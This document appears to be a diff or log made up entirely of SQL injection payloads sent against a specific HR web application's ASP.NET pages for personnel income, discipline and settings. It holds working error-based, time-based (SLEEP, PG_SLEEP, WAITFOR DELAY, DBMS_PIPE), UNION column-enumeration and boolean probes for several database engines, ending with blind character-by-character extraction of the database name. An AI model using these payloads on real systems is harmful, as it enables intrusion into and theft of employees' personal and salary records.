+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536%' AND 9482=CAST((CHR(58)||CHR(108)||CHR(117)||CHR(97)||CHR(58))||(SELECT (CASE WHEN (9482=9482) THEN 1 ELSE 0 END))::text||(CHR(58)||CHR(100)||CHR(112)||CHR(117)||CHR(58)) AS NUMERIC) AND '%'='
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536') AND 6660=CONVERT(INT,(CHAR(58)+CHAR(108)+CHAR(117)+CHAR(97)+CHAR(58)+(SELECT (CASE WHEN (6660=6660) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(58)+CHAR(100)+CHAR(112)+CHAR(117)+CHAR(58))) AND ('Jnti'='Jnti
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536' AND 6660=CONVERT(INT,(CHAR(58)+CHAR(108)+CHAR(117)+CHAR(97)+CHAR(58)+(SELECT (CASE WHEN (6660=6660) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(58)+CHAR(100)+CHAR(112)+CHAR(117)+CHAR(58))) AND 'ECJs'='ECJs
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536%' AND 6660=CONVERT(INT,(CHAR(58)+CHAR(108)+CHAR(117)+CHAR(97)+CHAR(58)+(SELECT (CASE WHEN (6660=6660) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(58)+CHAR(100)+CHAR(112)+CHAR(117)+CHAR(58))) AND '%'='
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536') AND 5262=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(108)||CHR(117)||CHR(97)||CHR(58)||(SELECT (CASE WHEN (5262=5262) THEN 1 ELSE 0 END) FROM DUAL)||CHR(58)||CHR(100)||CHR(112)||CHR(117)||CHR(58)||CHR(62))) FROM DUAL) AND ('vnRS'='vnRS
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536' AND 5262=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(108)||CHR(117)||CHR(97)||CHR(58)||(SELECT (CASE WHEN (5262=5262) THEN 1 ELSE 0 END) FROM DUAL)||CHR(58)||CHR(100)||CHR(112)||CHR(117)||CHR(58)||CHR(62))) FROM DUAL) AND 'tPps'='tPps
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536%' AND 5262=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(108)||CHR(117)||CHR(97)||CHR(58)||(SELECT (CASE WHEN (5262=5262) THEN 1 ELSE 0 END) FROM DUAL)||CHR(58)||CHR(100)||CHR(112)||CHR(117)||CHR(58)||CHR(62))) FROM DUAL) AND '%'='
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536'); SELECT SLEEP(5)-- 
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536'; SELECT SLEEP(5)-- 
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536%'; SELECT SLEEP(5)-- 
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536'); SELECT PG_SLEEP(5)--
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536'; SELECT PG_SLEEP(5)--
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536%'; SELECT PG_SLEEP(5)--
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536); WAITFOR DELAY '0:0:5'--
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536; WAITFOR DELAY '0:0:5'--
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536'); WAITFOR DELAY '0:0:5'--
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536'; WAITFOR DELAY '0:0:5'--
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536%'; WAITFOR DELAY '0:0:5'--
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536') AND SLEEP(5) AND ('NyDj'='NyDj
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536' AND SLEEP(5) AND 'RYUd'='RYUd
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536%' AND SLEEP(5) AND '%'='
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536') AND 1543=(SELECT 1543 FROM PG_SLEEP(5)) AND ('IAAK'='IAAK
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536' AND 1543=(SELECT 1543 FROM PG_SLEEP(5)) AND 'oRSm'='oRSm
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536%' AND 1543=(SELECT 1543 FROM PG_SLEEP(5)) AND '%'='
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536) WAITFOR DELAY '0:0:5'--
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536 WAITFOR DELAY '0:0:5'--
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536') WAITFOR DELAY '0:0:5'--
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536' WAITFOR DELAY '0:0:5'--
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536%' WAITFOR DELAY '0:0:5'--
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536') AND 5257=DBMS_PIPE.RECEIVE_MESSAGE(CHR(80)||CHR(77)||CHR(98)||CHR(76),5) AND ('yFmj'='yFmj
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536' AND 5257=DBMS_PIPE.RECEIVE_MESSAGE(CHR(80)||CHR(77)||CHR(98)||CHR(76),5) AND 'RpJx'='RpJx
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536%' AND 5257=DBMS_PIPE.RECEIVE_MESSAGE(CHR(80)||CHR(77)||CHR(98)||CHR(76),5) AND '%'='
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536') ORDER BY 1#
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536') ORDER BY 8588#
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536') LIMIT 0,1 UNION ALL SELECT NULL#
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536') LIMIT 0,1 UNION ALL SELECT NULL,NULL#
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536') LIMIT 0,1 UNION ALL SELECT NULL,NULL,NULL#
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536') LIMIT 0,1 UNION ALL SELECT NULL,NULL,NULL,NULL#
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536') LIMIT 0,1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL#
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536') LIMIT 0,1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL#
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536') LIMIT 0,1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536') LIMIT 0,1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536') LIMIT 0,1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536') LIMIT 0,1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536' ORDER BY 1#
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536' ORDER BY 3353#
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536' LIMIT 0,1 UNION ALL SELECT NULL#
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536' LIMIT 0,1 UNION ALL SELECT NULL,NULL#
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536' LIMIT 0,1 UNION ALL SELECT NULL,NULL,NULL#
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536' LIMIT 0,1 UNION ALL SELECT NULL,NULL,NULL,NULL#
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536' LIMIT 0,1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL#
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536' LIMIT 0,1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL#
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536' LIMIT 0,1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536' LIMIT 0,1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536' LIMIT 0,1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536' LIMIT 0,1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536%' ORDER BY 1#
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536%' ORDER BY 4396#
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536%' LIMIT 0,1 UNION ALL SELECT NULL#
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536%' LIMIT 0,1 UNION ALL SELECT NULL,NULL#
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536%' LIMIT 0,1 UNION ALL SELECT NULL,NULL,NULL#
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536%' LIMIT 0,1 UNION ALL SELECT NULL,NULL,NULL,NULL#
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536%' LIMIT 0,1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL#
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536%' LIMIT 0,1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL#
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536%' LIMIT 0,1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536%' LIMIT 0,1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536%' LIMIT 0,1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536%' LIMIT 0,1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536') ORDER BY 1-- 
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536') ORDER BY 6647-- 
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536') UNION ALL SELECT NULL-- 
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536') UNION ALL SELECT NULL,NULL-- 
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536') UNION ALL SELECT NULL,NULL,NULL-- 
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536') UNION ALL SELECT NULL,NULL,NULL,NULL-- 
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL-- 
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL-- 
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536' ORDER BY 1-- 
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536' ORDER BY 9647-- 
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536' UNION ALL SELECT NULL-- 
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536' UNION ALL SELECT NULL,NULL-- 
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536' UNION ALL SELECT NULL,NULL,NULL-- 
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536' UNION ALL SELECT NULL,NULL,NULL,NULL-- 
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL-- 
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL-- 
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536%' ORDER BY 1-- 
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536%' ORDER BY 9004-- 
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536%' UNION ALL SELECT NULL-- 
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536%' UNION ALL SELECT NULL,NULL-- 
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536%' UNION ALL SELECT NULL,NULL,NULL-- 
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536%' UNION ALL SELECT NULL,NULL,NULL,NULL-- 
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL-- 
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL-- 
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536'[[,,[')[]
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536') AND 1874=1398 AND ('BwwO'='BwwO
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536') AND 1844=1844 AND ('duJs'='duJs
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536') AND 5610=1651 AND ('GiwE'='GiwE
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536' AND 7809=9632 AND 'TXNv'='TXNv
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536' AND 1844=1844 AND 'Gjcn'='Gjcn
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536' AND 3942=8361 AND 'dscY'='dscY
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536%' AND 8830=2408 AND '%'='
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536%' AND 1844=1844 AND '%'='
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536%' AND 2420=9884 AND '%'='
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536') AND (SELECT 9228 FROM(SELECT COUNT(*),CONCAT(0x3a696e6d3a,(SELECT (CASE WHEN (9228=9228) THEN 1 ELSE 0 END)),0x3a7a696a3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND ('fwzd'='fwzd
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536' AND (SELECT 9228 FROM(SELECT COUNT(*),CONCAT(0x3a696e6d3a,(SELECT (CASE WHEN (9228=9228) THEN 1 ELSE 0 END)),0x3a7a696a3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'IzZm'='IzZm
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536%' AND (SELECT 9228 FROM(SELECT COUNT(*),CONCAT(0x3a696e6d3a,(SELECT (CASE WHEN (9228=9228) THEN 1 ELSE 0 END)),0x3a7a696a3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND '%'='
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536') AND 8552=CAST((CHR(58)||CHR(105)||CHR(110)||CHR(109)||CHR(58))||(SELECT (CASE WHEN (8552=8552) THEN 1 ELSE 0 END))::text||(CHR(58)||CHR(122)||CHR(105)||CHR(106)||CHR(58)) AS NUMERIC) AND ('pYgy'='pYgy
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536' AND 8552=CAST((CHR(58)||CHR(105)||CHR(110)||CHR(109)||CHR(58))||(SELECT (CASE WHEN (8552=8552) THEN 1 ELSE 0 END))::text||(CHR(58)||CHR(122)||CHR(105)||CHR(106)||CHR(58)) AS NUMERIC) AND 'rKpH'='rKpH
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536%' AND 8552=CAST((CHR(58)||CHR(105)||CHR(110)||CHR(109)||CHR(58))||(SELECT (CASE WHEN (8552=8552) THEN 1 ELSE 0 END))::text||(CHR(58)||CHR(122)||CHR(105)||CHR(106)||CHR(58)) AS NUMERIC) AND '%'='
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536') AND 8564=CONVERT(INT,(CHAR(58)+CHAR(105)+CHAR(110)+CHAR(109)+CHAR(58)+(SELECT (CASE WHEN (8564=8564) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(58)+CHAR(122)+CHAR(105)+CHAR(106)+CHAR(58))) AND ('pwWe'='pwWe
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536' AND 8564=CONVERT(INT,(CHAR(58)+CHAR(105)+CHAR(110)+CHAR(109)+CHAR(58)+(SELECT (CASE WHEN (8564=8564) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(58)+CHAR(122)+CHAR(105)+CHAR(106)+CHAR(58))) AND 'dIZf'='dIZf
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536%' AND 8564=CONVERT(INT,(CHAR(58)+CHAR(105)+CHAR(110)+CHAR(109)+CHAR(58)+(SELECT (CASE WHEN (8564=8564) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(58)+CHAR(122)+CHAR(105)+CHAR(106)+CHAR(58))) AND '%'='
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536') AND 7337=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(105)||CHR(110)||CHR(109)||CHR(58)||(SELECT (CASE WHEN (7337=7337) THEN 1 ELSE 0 END) FROM DUAL)||CHR(58)||CHR(122)||CHR(105)||CHR(106)||CHR(58)||CHR(62))) FROM DUAL) AND ('fLoH'='fLoH
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536' AND 7337=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(105)||CHR(110)||CHR(109)||CHR(58)||(SELECT (CASE WHEN (7337=7337) THEN 1 ELSE 0 END) FROM DUAL)||CHR(58)||CHR(122)||CHR(105)||CHR(106)||CHR(58)||CHR(62))) FROM DUAL) AND 'AFAt'='AFAt
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536%' AND 7337=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(105)||CHR(110)||CHR(109)||CHR(58)||(SELECT (CASE WHEN (7337=7337) THEN 1 ELSE 0 END) FROM DUAL)||CHR(58)||CHR(122)||CHR(105)||CHR(106)||CHR(58)||CHR(62))) FROM DUAL) AND '%'='
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536 IF((61+67)=128) WAITFOR DELAY '0:0:5'--
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536 IF(61>(38+67)) WAITFOR DELAY '0:0:5'--
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536 IF((38+61)>166) WAITFOR DELAY '0:0:5'--
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536 IF(128=(61+67)) WAITFOR DELAY '0:0:5'--
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536 IF(2002                                                                                                                                                                                                                                                                =                                                                                                                                                                                                                                                                2002) WAITFOR DELAY '0:0:5'--
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536 IF(BINARY_CHECKSUM(9328)=BINARY_CHECKSUM(9328)) WAITFOR DELAY '0:0:5'--
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536 IF(HOST_NAME()=HOST_NAME()) WAITFOR DELAY '0:0:5'--
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536 IF(XACT_STATE()=XACT_STATE()) WAITFOR DELAY '0:0:5'--
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536 IF(SYSDATETIME()=SYSDATETIME()) WAITFOR DELAY '0:0:5'--
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=NUL%' and 1=1 and '%'='
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=NUL%' and 1=2 and '%'='
+/HR3/Common/ErrorPage/SystemSettingInfo.aspx	__EVENTTARGET=BtnOk&EmpID=766360' aNd 1=2 unIon all selEct cHar(94)+cHar(91)+db_name(0)+cHar(93)+cHar(94) --
+/HR3/Common/ErrorPage/SystemSettingInfo.aspx	__EVENTTARGET=BtnOk&EmpID=766360'
+/hr3/personnel/lzh/lzhdisciplineedit.aspx	recid=101533) AND 7060=7422 AND (7029=7029
+/hr3/personnel/lzh/lzhdisciplineedit.aspx	recid=101533) AND 8144=8144 AND (2256=2256
+/hr3/personnel/lzh/lzhdisciplineedit.aspx	recid=101533 AND 9389=7741
+/hr3/personnel/lzh/lzhdisciplineedit.aspx	recid=101533 AND 8144=8144
+/hr3/personnel/lzh/lzhdisciplineedit.aspx	recid=101533 AND 9300=2123
+/hr3/personnel/lzh/lzhdisciplineedit.aspx	recid=101533 AND (SELECT 6004 FROM(SELECT COUNT(*),CONCAT(0x3a716d723a,(SELECT (CASE WHEN (6004=6004) THEN 1 ELSE 0 END)),0x3a6469633a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+/hr3/personnel/lzh/lzhdisciplineedit.aspx	recid=101533 AND 7652=CAST((CHR(58)||CHR(113)||CHR(109)||CHR(114)||CHR(58))||(SELECT (CASE WHEN (7652=7652) THEN 1 ELSE 0 END))::text||(CHR(58)||CHR(100)||CHR(105)||CHR(99)||CHR(58)) AS NUMERIC)
+/hr3/personnel/lzh/lzhdisciplineedit.aspx	recid=101533 AND 3580=CONVERT(INT,(CHAR(58)+CHAR(113)+CHAR(109)+CHAR(114)+CHAR(58)+(SELECT (CASE WHEN (3580=3580) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(58)+CHAR(100)+CHAR(105)+CHAR(99)+CHAR(58)))
+/hr3/personnel/lzh/lzhdisciplineedit.aspx	recid=101533 AND 2288=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(109)||CHR(114)||CHR(58)||(SELECT (CASE WHEN (2288=2288) THEN 1 ELSE 0 END) FROM DUAL)||CHR(58)||CHR(100)||CHR(105)||CHR(99)||CHR(58)||CHR(62))) FROM DUAL)
+/hr3/personnel/lzh/lzhdisciplineedit.aspx	recid=101533 AND SLEEP(5)
+/hr3/personnel/lzh/lzhdisciplineedit.aspx	recid=101533 AND 6972=(SELECT 6972 FROM PG_SLEEP(5))
+/hr3/personnel/lzh/lzhdisciplineedit.aspx	recid=101533 AND 6141=DBMS_PIPE.RECEIVE_MESSAGE(CHR(98)||CHR(119)||CHR(113)||CHR(107),5)
+/hr3/personnel/lzh/lzhdisciplineedit.aspx	recid=101533 AND (35+30)=65
+/hr3/personnel/lzh/lzhdisciplineedit.aspx	recid=101533 AND 30>(43+35)
+/hr3/personnel/lzh/lzhdisciplineedit.aspx	recid=101533 AND (43+30)>108
+/hr3/personnel/lzh/lzhdisciplineedit.aspx	recid=101533 AND 65=(35+30)
+/hr3/personnel/lzh/lzhdisciplineedit.aspx	recid=101533 AND 5788                                                                                                                                                                                                                                                                =                                                                                                                                                                                                                                                                5788
+/hr3/personnel/lzh/lzhdisciplineedit.aspx	recid=101533 AND QUARTER(NULL) IS NULL
+/hr3/personnel/lzh/lzhdisciplineedit.aspx	recid=101533 AND ROWNUM=ROWNUM
+/hr3/personnel/lzh/lzhdisciplineedit.aspx	recid=101533 AND 5::int=5
+/hr3/personnel/lzh/lzhdisciplineedit.aspx	recid=101533 AND BINARY_CHECKSUM(6439)=BINARY_CHECKSUM(6439)
+/hr3/personnel/lzh/lzhdisciplineedit.aspx	recid=101533 AND HOST_NAME()=HOST_NAME()
+/hr3/personnel/lzh/lzhdisciplineedit.aspx	recid=101533 AND XACT_STATE()=XACT_STATE()
+/hr3/personnel/lzh/lzhdisciplineedit.aspx	recid=101533 AND SYSDATETIME()=SYSDATETIME()
+/hr3/personnel/lzh/lzhdisciplineedit.aspx	recid=101533 AND UNICODE(SUBSTRING((SELECT ISNULL(CAST(DB_NAME() AS NVARCHAR(4000)),CHAR(32))),1,1)) > 64
+/hr3/personnel/lzh/lzhdisciplineedit.aspx	recid=101533 AND UNICODE(SUBSTRING((SELECT ISNULL(CAST(DB_NAME() AS NVARCHAR(4000)),CHAR(32))),1,1)) > 96
+/hr3/personnel/lzh/lzhdisciplineedit.aspx	recid=101533 AND UNICODE(SUBSTRING((SELECT ISNULL(CAST(DB_NAME() AS NVARCHAR(4000)),CHAR(32))),1,1)) > 112
+/hr3/personnel/lzh/lzhdisciplineedit.aspx	recid=101533 AND UNICODE(SUBSTRING((SELECT ISNULL(CAST(DB_NAME() AS NVARCHAR(4000)),CHAR(32))),1,1)) > 104
+/hr3/personnel/lzh/lzhdisciplineedit.aspx	recid=101533 AND UNICODE(SUBSTRING((SELECT ISNULL(CAST(DB_NAME() AS NVARCHAR(4000)),CHAR(32))),1,1)) > 100
